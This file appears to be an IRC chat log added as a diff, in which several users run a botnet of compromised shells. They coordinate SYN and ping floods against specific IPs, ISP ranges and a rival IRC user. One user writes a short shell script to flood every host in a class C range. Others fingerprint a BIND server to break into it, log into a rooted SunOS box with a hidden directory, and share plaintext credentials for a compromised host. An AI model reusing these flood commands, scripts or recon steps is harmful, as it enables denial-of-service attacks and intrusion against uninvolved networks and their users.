@@ -1,0 +1,620 @@
+:m4ry :.deop jupe
+:m4ry :.up
+:m4ry :wise op m4ry
+:m4ry :wise deop jupe
+:m4ry :.say hi
+:kaos__ :hi
+:kaos____ :hi
+:kaos_____ :hi
+:_aos_____ :hi
+:kaos___ :hi
+:jupe :hi
+:m4ry :jupe part
+:D1ck :kaos__ nick nutsack
+:D1ck :kaos___ nick dumbly
+:D1ck :%kaos____ nick rewted
+:D1ck :kaos_____ nick bate
+:D1ck :_aos_____ nick anarchy
+:D1ck :kaos____ nick cutlose
+:D1ck :.add D1ck * D1ck 100 1 4
+:D1ck :.save
+:D1ck :_aos_____ nick duke
+:D1ck :J4n3 
+:D1ck ::)
+:J4n3 :D1ck nick SeXyGuy19
+:D1ck :there?
+:D1ck :hahaa
+:J4n3 :yeah :)
+:D1ck : /nick SeXyGuy19
+:J4n3 :heh
+:D1ck ::)
+:D1ck :hh
+:D1ck :;)
+:D1ck :cool bots?
+:D1ck :.add J4n3 * J4n3 100 1 4
+:D1ck :.save
+:D1ck :oye
+:D1ck :we have to change the key
+:D1ck :.join #
+:J4n3 :humm
+:D1ck :heh
+:D1ck :lagged
+:D1ck :worldtel sucks.
+:J4n3 :heh why change the key ?
+:D1ck :oye
+:D1ck :J4n3 
+:D1ck :load shells
+:D1ck :we have to dos
+:D1ck :i am ready with 4
+:D1ck :u load 4-5
+:D1ck :dos RR
+:D1ck :and
+:D1ck :Deadrat
+:J4n3 :hermm
+:D1ck :ok?????????
+:J4n3 :wait
+:D1ck :please
+:D1ck :192.168.6.223
+:D1ck :and
+:D1ck :./syn 0 192.168.6.223 1 1024
+:D1ck :ok just dos this 38 wala with 2 boxes
+:D1ck :and the other with rest
+:D1ck :coz i`m dosing it
+:D1ck :./s2 0 192.168.6.223 1 1024
+:J4n3 :humm ok
+:D1ck :okies
+:D1ck :thanks
+:D1ck :me dosing too
+:D1ck :./syn 0 192.168.6.223 1 1024
+:D1ck :oye sun u dosing?
+:D1ck :started?
+:J4n3 :yup
+:J4n3 :lagging badlay yaara
+:D1ck :oye
+:D1ck :he changed hosts
+:D1ck : Signon by DeadRat
+:D1ck :oye stop dos on him
+:D1ck :and dos
+:D1ck :node177190.example.edu
+:J4n3 :hmm
+:J4n3 :waito
+:J4n3 :./syn 0  node177190.example.edu 1 1024
+:D1ck :./syn 0 192.168.177.190 1 1024
+:D1ck :nope ip
+:J4n3 :yeah yeah 
+:D1ck :thanks
+:D1ck ::)
+:J4n3 ::O)
+:D1ck :thanks J4n3 
+:D1ck :me also dosing
+:D1ck :boh dossed
+:D1ck :both
+:D1ck ::)
+:J4n3 :hehe
+:D1ck :heh
+:D1ckhack :.part
+:D1ck :.join #
+:D1ck :.join #
+:J4n3 :oye what happened ?
+:J4n3 :oey
+:D1ckhack :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:D1ck :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:J4n3 :oye shn1p3r
+:J4n3 :D1ck reply man
+:J4n3 :i'll tell u a kewl way :p
+:J4n3 :new trick :p
+:J4n3 :reboot windows heeh with no programz
+:J4n3 :D1ck
+:D1ckhack :.op
+:D1ckhack :.up
+:D1ck :J4n3 
+:D1ck ::)
+:D1ck :sup baby
+:J4n3 :u on winbl0ws ?
+:D1ck :nope
+:D1ck ::)
+:D1ck :128 bots
+:J4n3 :oh
+:J4n3 :i c 
+:J4n3 :lol yeah
+:J4n3 :oye i can reboot any win98 machine :p
+:D1ck :kewl
+:D1ck :0-day?
+:J4n3 :hahaha no sploit
+:D1ck :do u use ath0.c by th0m45?
+:J4n3 :just a simple ping command :p
+:D1ck :can d/c any one
+:D1ck :hahahahaha
+:D1ck :2b2b2b2000db
+:D1ck :?
+:J4n3 :no but it works only with zoltrix modem 
+:J4n3 :and it disconnects urself too :(
+:J4n3 :noooooo
+:J4n3 ::p
+:D1ck :2b2b2b415448300d
+:J4n3 :noooooooooooo
+:D1ck :oh
+:J4n3 ::p
+:D1ck :send me the coce
+:D1ck :i will make a shell script
+:J4n3 :haha abay simple online command of ping
+:J4n3 :and it will reboot any win98 machine or hang it
+:D1ck :kewl
+:D1ck :give me the ping command
+:J4n3 :but
+:J4n3 :works with linux only
+:J4n3 :and if u do it with ur own box, it will kill u with lag
+:J4n3 :do it from a linux rewt
+:J4n3 :in 1 minute it will dc and hang the system
+:J4n3 :command is
+:J4n3 :ping -f -s 65000 <IP> :pPPpPp
+:D1ck :kewl
+:D1ck :wait
+:J4n3 :ok but dont try it on me :/
+:J4n3 ::/
+:D1ck :#
+:D1ck :if [ $# 
+:D1ck :echo " "
+:D1ck :echo "[*] Usage $0 IP"
+:D1ck :echo "[*] ping reboot any win 9.x machine by D1ck, Idea by J4n3."
+:D1ck :echo " "
+:D1ck :exit
+:D1ck :else
+:D1ck :ping -f -s 65000 $1
+:D1ck :fi
+:D1ck :kewl
+:D1ck :?
+:J4n3 :lol set
+:J4n3 :tyte
+:D1ck :give me some ips
+:D1ck :hehehe
+:D1ck :dont worry
+:J4n3 :try it on 192.168.68.163
+:D1ck :oye
+:D1ck :i made a script
+:D1ck :u can reboot ever user of a class c
+:D1ck :with this
+:D1ck :./reboot.sh 192.168.252
+:J4n3 :oh no
+:D1ck :will reboot ever uses using this
+:D1ck :kewl?
+:J4n3 :shit no
+:J4n3 :wahi ping command ?
+:D1ck :heheh
+:D1ck :wait 
+:D1ck :i`m making it
+:J4n3 :kewl kewl bana,  phir syn and smurf kaa kaam khatam :P
+:J4n3 :but bnc walon ka nahin hoga :(
+:J4n3 :unkay liye syn hee sahi hai
+:D1ck :yep
+:D1ck :?
+:D1ck :oye how many ppl know about it?
+:J4n3 :no one
+:J4n3 :except moi :p
+:J4n3 :dont spread it :p
+:J4n3 :i've seen it written somewhere in a txt of some sploit
+:J4n3 :but its not common, and no one know about it yet
+:D1ck :kewl
+:D1ck :oye done 
+:D1ck :i`ll send u ina  phew
+:J4n3 :kewl kewl :P
+:J4n3 :okies :)
+:J4n3 :try it on some isp
+:D1ck :yep
+:D1ck :oye J4n3 
+:D1ck :give me some isp
+:D1ck :which should i n3wk
+:D1ck :?
+:J4n3 :hmmm
+:J4n3 :try satnet naa
+:D1ck :?hahha
+:D1ck :ok
+:D1ck :192.168.2?
+:D1ck :192.168.25/?
+:D1ck :?
+:J4n3 :hmm
+:J4n3 :192.168.25.*
+:D1ck :./rebootclass.sh 192.168.25.1
+:J4n3 :kewl lets see
+:D1ck :...............................................................................................................................................................................................................................................................................................................................................................
+:D1ck :one sec
+:D1ck :let me see
+:D1ck :i think i`ll have to write a looop
+:D1ck :but lets see
+:J4n3 :hmm ok
+:D1ck :ooops
+:D1ck :i frgot to chmod +x a file hehe
+:D1ck :fixed
+:J4n3 ::??
+:J4n3 :lol
+:J4n3 :ok
+:D1ck :done
+:D1ck :lets see if they ping out
+:D1ck :join #delusion
+:D1ck :and see
+:D1ck :?P
+:J4n3 :ok wait
+:D1ck :oye
+:D1ck :are u sure this command works?
+:D1ck :give me some ip
+:D1ck :i`ll d.c them
+:J4n3 :100 %
+:J4n3 ::p
+:J4n3 :when i try it on a single ip, it goes down 101 %
+:J4n3 :haven't found one who didn't go offline
+:D1ck :oye
+:D1ck :u there?
+:D1ck :J4n3 
+:D1ck :fucking worldtel
+:D1ck :fucking worldtel
+:D1ck :fucking worldtel
+:D1ck :fucking worldtel
+:D1ck :fucking worldtel
+:D1ck :fucking worldtel
+:D1ck :sux muh azz
+:D1ck ::)
+:D1ck :'az''
+:D1ck :accept the script
+:D1ck :hmmm
+:D1ck :?
+:D1ck :J4n3 
+:D1ck :world tel
+:D1ck :sux
+:D1ck :J4n3 
+:D1ck :NEW KEY J4n3 
+:D1ck :get it
+:D1ck ::)
+:D1ckhack :ACTION is away: (MOVIE #@$@
+:D1ck :ACTION is away: (MOVIE #@$@
+:D1ck :pnp sux
+:D1ck :pnp sux
+:J4n3 :lol still ?
+:D1ck :when i double click i want the chaninfo with topic bans etc
+:D1ck :it gives me a input box, to write topic
+:D1ck :blah
+:D1ck :heh
+:J4n3 :HAHAHAHAH
+:J4n3 :lol
+:D1ck ::P
+:J4n3
+:J4n3
+:J4n3
+:J4n3
+:D1ck :(@az): and what's with the topic
+:D1ck :*** BigPoppa changes topic to 'booop'
+:D1ck :(@az): owning g|nger` ?
+:D1ck :*** DeadRat sets mode: +o h4r33
+:D1ck :l3w|
+:J4n3 :hehe
+:D1ck :(symetrix`): im a korjap
+:D1ck :(@h4r33): <maxxed> 24.143.24.1
+:D1ck :(@h4r33): <maxxed> its my uplink and its unkillable
+:D1ck :(@h4r33): <maxxed> sure you can kill me but you can't take the uplink down
+:D1ck :(@h4r33): HAHAAAAAAAAAAAA
+:D1ck :(@madcow-): why would you want to kill your uplink?
+:D1ck :* symetrix` munches on some rice
+:D1ck :(@h4r33): mother fuckin uplink is DEAD
+:D1ck :he thinks dosing is 'COO'L' *shrug*
+:J4n3 :lol
+:D1ck :(@BigPoppa): diz
+:D1ck :(@BigPoppa): has there ever been something you couldnt kill?
+:D1ck :(@madcow-): me
+:D1ck :(@madcow-): :)
+:D1ck :(@h4r33): not yet
+:D1ck :oye
+:D1ck :come to windows
+:D1ck :and i`m loading up 30+ of my shells
+:D1ck :to dos
+:D1ck :u load too
+:J4n3 :i am in windows
+:J4n3 :and ready to dos
+:D1ck :if u want
+:J4n3 :just give me the IP
+:D1ck :if u dont we will do it another day
+:D1ck ::)
+:J4n3 :i have 11 boxes ready
+:D1ck :kewl
+:D1ck :let me load up
+:J4n3 :kkz
+:D1ck :how many boxes?
+:J4n3 :11
+:D1ck :oki
+:D1ck :[*] Loading Boxens....
+:J4n3 :heh
+:J4n3 :ip ?
+:J4n3 :my 11 boxes r enuff to take down anyone :p
+:D1ck :lol
+:D1ck ::)
+:J4n3 ::)
+:J4n3 :ogin: root
+:J4n3 :Password:
+:J4n3 :Sun Microsystems Inc.   SunOS 5.7       Generic October 1998
+:J4n3 :These are the times that try anybody's soul.
+:J4n3 :A bird in the hand can bite. 
+:J4n3 :You have mail.
+:J4n3 :# cd /dev/".. "/sun2/packet
+:J4n3 :# 
+:D1ck :system.example.com
+:D1ck :oye
+:D1ck :do this
+:D1ck :dig @system.example.com version.bind chaos txt
+:D1ck :and paste me what u get
+:J4n3 :i'm on windows
+:J4n3 :where ??
+:J4n3 :from any box ?
+:D1ck :oh
+:D1ck :try if dig works
+:J4n3 :wait
+:J4n3 :VERSION.BIND.           0S CHAOS TXT    "8.2.1"
+:J4n3 :; <<>> DiG 8.2 <<>> @system.example.com version.bind chaos txt
+:J4n3 :;
+:J4n3 :;; FROM: gujarat to SERVER: system.example.com 192.168.244.99
+:J4n3 :;; Total query time: 467 msec
+:J4n3 :;; ANSWER SECTION:
+:J4n3 :;; version.bind, type = TXT, class = CHAOS
+:J4n3 :;; QUERY SECTION:
+:J4n3 :;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+:D1ck :LOL
+:J4n3 :;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10
+:D1ck :LOL
+:D1ck :LOL
+:D1ck :LOL
+:D1ck :LOL
+:D1ck :LOL
+:J4n3 :;; got answer:
+:D1ck :I WILL OWN IT
+:J4n3 :;; res options: init recurs defnam dnsrch
+:J4n3 :; (1 server found)
+:J4n3 :; (1 server found)
+:J4n3 :hehe
+:J4n3 :who's this ?
+:D1ck :BWHAHAHAHAHA
+:D1ck :h4r33^
+:D1ck :i`ll own it
+:D1ck :lamer cant even path his box
+:J4n3 :kewl
+:J4n3 :tight
+:J4n3 :kar kar own kar
+:D1ck :heh
+:D1ck :he's such a lamer
+:D1ck :let me reboot
+:D1ck :brb
+:D1ck :brb
+:J4n3 :heh okies
+:D1ck :oye
+:D1ck :u there?
+:J4n3 :yeah
+:D1ck :my NS is getting 43503495-43-593 quries
+:D1ck ::?(
+:D1ck ::(
+:J4n3 :huh
+:J4n3 ::/
+:D1ck :lol
+:J4n3 :what's the chances ?
+:D1ck :100% if my NS is working like yesterday
+:D1ck :shit i think named is dead
+:J4n3 :oh :(
+:D1ck :;; res_nsend to server system.example.com  192.168.244.99: Connection timed out
+:D1ck :som one is dosing em
+:D1ck :or
+:D1ck :some thing is wrong
+:J4n3 :hmmm
+:J4n3 :try later
+:D1ck :k
+:D1ck :system.example.com
+:D1ck :remember
+:D1ck :i will own it tonight
+:J4n3 :yeah
+:J4n3 :sure
+:D1ck ::P
+:D1ck :hurry its important
+:D1ck :
+:D1ckhack :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:D1ck :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:J4n3 :D1ck 
+:J4n3 :what happened ?? sorry main neechay gaya tha
+:J4n3 :kuch khaanay
+:D1ck :np
+:D1ck :never mind
+:D1ck :yaar
+:D1ck :i was wondering
+:D1ck :when we change login
+:D1ck :admin cant login
+:D1ck :so thats fucked?
+:D1ck :linux
+:D1ck :?
+:J4n3 :hmmm
+:J4n3 :yahi main humesha sochta hon
+:J4n3 :lekin i think aisa nahin hai 
+:J4n3 :unka login chaltha hai
+:D1ck :nope
+:D1ck :it doesnt workl
+:D1ck :i tried
+:J4n3 :what ?? i mean u dont know what admin pass is
+:D1ck :login: dynamic
+:D1ck :Password:
+:D1ck :Login incorrect
+:D1ck :login: dynamic
+:D1ck :Password:
+:D1ck :that sux
+:D1ck :i`m doing it with my box
+:D1ck :send me the root/owned
+:D1ck :let me try that
+:J4n3 :hmm its on linux :/
+:J4n3 :wait wait
+:D1ck :shit
+:J4n3 :try my zippy.example.org
+:D1ck ::(
+:D1ck :oki
+:D1ck :k
+:D1ck :user/pass?
+:J4n3 :user : micr0n
+:J4n3 :pass : ashunkla
+:D1ck :k
+:D1ck :name?
+:D1ck :of the file
+:D1ck :never mind
+:D1ck :brb i have to change their normal login
+:D1ck :brb
+:J4n3 :oye
+:J4n3 :linux.tar hai
+:J4n3 :D1ck 
+:D1ck :J4n3 
+:D1ck :?
+:J4n3 :oye can j0e know the key of K1dd13 ???
+:D1ck :yep
+:D1ck :he can
+:J4n3 :ok thanx :)
+:J4n3 :i trust him 100 % :)
+:D1ck :kewl
+:D1ck :oye 
+:D1ck :dos h4r33
+:D1ck :so i can jupoe him and annoy ircops
+:D1ck :like i always do :
+:D1ck ::P
+:D1ck :and get him glined
+:D1ck :and #delusion is edge of being purge
+:J4n3 :oh yaar i have to lead shell's again, sub band kardeen , sonay ja raha tha, if u say i
+:J4n3 :load again
+:J4n3 :waisay channel #delusion tho pehlay bee purge hogaya tha, benchodon nay dubara layliya
+:D1ck :no
+:D1ck :its ok
+:D1ck ::)
+:D1ck :coz rr did
+:D1ck :rr is my freind
+:D1ck :rr is freinds with danny (the personm who purged it)
+:J4n3 :oh oh
+:J4n3 :kewl
+:D1ck :and diz sucked rr ballz to give him w and he will own his soul to him
+:J4n3 :i wish get it purged
+:D1ck :so rr decided he would help em if he doesnt say lame shit
+:D1ck :so thats what happened
+:J4n3 :ahaaaaan
+:J4n3 :now rr want to purge it again ?
+:D1ck :yep
+:D1ck :he wants to
+:D1ck :but his relations with opes isnt as good as before
+:D1ck :he is trying
+:D1ck :can u dos him with 2 shells plls
+:D1ck ::/
+:D1ck :only 2
+:D1ck :not more
+:J4n3 :hmm kewl :)
+:D1ck ::P
+:D1ck ::P
+:J4n3 :ok wait
+:D1ck :thanks
+:D1ck :thanks
+:J4n3 :naa now i'll load 8 to 10 wait
+:D1ck :hehe
+:D1ck :no no
+:D1ck :jani
+:D1ck :u need 2 shells for diz .xx
+:D1ck ::LP
+:J4n3 :hehe wait naa already loaded 5 
+:D1ck :hehe
+:D1ck :thx
+:D1ck ::)
+:J4n3 :ok what's the iP ?
+:D1ck :hehe
+:D1ck :192.168.1.99
+:J4n3 :hmmm hold on
+:D1ck :ok
+:J4n3 :what's his nick ?
+:D1ck :h4r33
+:D1ck :unet is lagged
+:D1ck :MEWHEHEHE
+:D1ck : Signoff by h4r33
+:D1ck :kewl
+:D1ck ::))))
+:J4n3 :he will go down soooooon
+:D1ck :<T|mm|n8r:#delusion> *** h4r33 has quit IRC (Ping timeout for
+:D1ck :                     h4r33[ns3.example.net.xx])         whats he doing in
+:D1ck :                     the place
+:D1ck :pheared
+:D1ck :
+:J4n3 :fuck i emailed them, but donno the address :/  sent to root  postmaster, support sales help 
+:J4n3 :but donno they got it or not, 
+:D1ck :no man
+:D1ck :i have their main 15 MB PIPE hub
+:D1ck :the whole example depend on
+:J4n3 :kewl
+:D1ck ::P
+:D1ck :yep
+:D1ck :stop it
+:h4r33 ::P
+:J4n3 :wtf ?
+:D1ck :?
+:D1ck :that was me
+:J4n3 :errrrrrrrrr
+:J4n3 :lol
+:D1ck :lol
+:J4n3 :He He He He
+:D1ck ::P
+:J4n3 :oye what's the bnc pass for ns2.example.net ?
+:j0e :uffo ehhe
+:j0e :itnay saray bots
+:J4n3 :hehe
+:D1ck :hey j0e 
+:D1ck :hehe
+:D1ck :hey J4n3 
+:j0e :lol
+:Sp07 :lots of bots
+:D1ck :`im missing 50
+:Sp07 :hehe
+:Sp07 :set up crontab
+:Sp07 :on each one
+:D1ck :.join #7thsphere
+:D1ck :.part #7thsphere 
+:Sp07 :.part #7thsphere 
+:Sp07_ :7th(2k) using ..15cryptonik 14ice 14(15alpha14)
+:Sp07 :d1ck
+:Sp07 :make me a bnc on a fast server =D
+:D1ck :kaos___ nick nameserver
+:D1ck :heh
+:Sp07 :oc3
+:Sp07 :hehe
+:Sp07 :why dont you make some vhosts?
+:Sp07 :with your nameservers
+:Sp07 :hehe
+:Sp07 :K1dd13.timenet.net
+:D1ck :hehe
+:D1ck :Sp07.rooted.his.first.box.from.timenet.net
+:D1ck :hehe
+:Sp07 :hehe
+:D1ck :i`ll point
+:D1ck :later
+:D1ck :its 9 am
+:D1ck :and i dint sleep
+:Sp07 :hehe
+:Sp07 :sleep is for wussies
+:D1ck :kaos__ nick freebsd
+:D1ck :kaos___ nick jin
+:Sp07 :its 9 pm and I still didnt study for this test
+:D1ck :hahahha
+:D1ck :kaos__ nick netb
+:D1ck :kaos___ bbiab
+:D1ck :kaos___ nick bbiab
+:D1ck :.save
+:D1ck :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:Sp07 :d1ck you here?
+:D1ck :.join #7thsphere 
+:acidklown
+:txdcc01
+:txdcc01
+:txdcc01
+:txdcc01 Check it out
+:txdcc01
+:txdcc01
+:Gemru^wu
+:Sp07
+:Sp07
+:zmasterz
+:Gemru^wu
+:D1ck :.part #7thsphere 
+:D1ck :.part #7thsphere 
+:Sp07 :thats a lot of bots
+:Sp07 :heh
+:Sp07 :thats a lot of ping timeouts
+:Sp07 :hehe
+:D1ck :.part #7thsphere 
